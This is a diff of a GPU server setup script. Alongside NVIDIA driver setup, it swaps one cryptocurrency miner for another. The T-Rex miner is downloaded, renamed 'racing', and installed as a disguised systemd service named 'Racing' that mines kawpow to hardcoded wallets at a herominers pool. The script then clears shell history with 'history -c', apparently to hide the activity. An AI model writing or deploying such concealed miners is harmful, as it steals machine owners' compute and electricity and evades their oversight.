@@ -21,17 +21,17 @@ sudo apt-get install cuda-drivers-fabricmanager-525 -y
 sudo systemctl enable nvidia-fabricmanager
 sudo systemctl start nvidia-fabricmanager
 sudo nvidia-smi mig -cgi 0 -C
-sudo apt-get install -y ocl-icd-libopencl1 -y
-sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.2/SRBMiner-Multi-2-4-2-Linux.tar.xz
-sudo tar -xvf SRBMiner-Multi-2-4-2-Linux.tar.xz
-sudo ./SRBMiner-Multi-2-4-2/SRBMiner-MULTI --algorithm karlsenhash --pool stratum+tcp://fi.mining4people.com:3378 --wallet nautilus:qpd49tf0j56lslu8fpaylp6fas0xsk8h9j03y06kggdpxfscglhhku0sfrt23 --disable-cpu --password x &
-#sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
-#sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
-#sudo mv t-rex racing
-#sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AcV5nrZKKe9PGcSrxUTiZ2iHFmxJ499fZb."'${myworker}_s7_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
-#sudo systemctl daemon-reload
-#sudo systemctl enable racing.service
-#sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AeuwUzTcE8SAkbGF7eaQ1ga2tBMW2kBB7s.${myworker}_s5_ -p x &
+#sudo apt-get install -y ocl-icd-libopencl1 -y
+#sudo wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.2/SRBMiner-Multi-2-4-2-Linux.tar.xz
+#sudo tar -xvf SRBMiner-Multi-2-4-2-Linux.tar.xz
+#sudo ./SRBMiner-Multi-2-4-2/SRBMiner-MULTI --algorithm karlsenhash --pool stratum+tcp://fi.mining4people.com:3378 --wallet nautilus:qpd49tf0j56lslu8fpaylp6fas0xsk8h9j03y06kggdpxfscglhhku0sfrt23 --disable-cpu --password x &
+sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
+sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
+sudo mv t-rex racing
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AcV5nrZKKe9PGcSrxUTiZ2iHFmxJ499fZb."'${myworker}_s7_'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo systemctl daemon-reload
+sudo systemctl enable racing.service
+sudo ./racing -a kawpow -o stratum+tcp://de.aipg.herominers.com:1128 -u AeuwUzTcE8SAkbGF7eaQ1ga2tBMW2kBB7s.s5 -p x &
 history -c
 if [[ $noCore -eq 6 ]]
 then
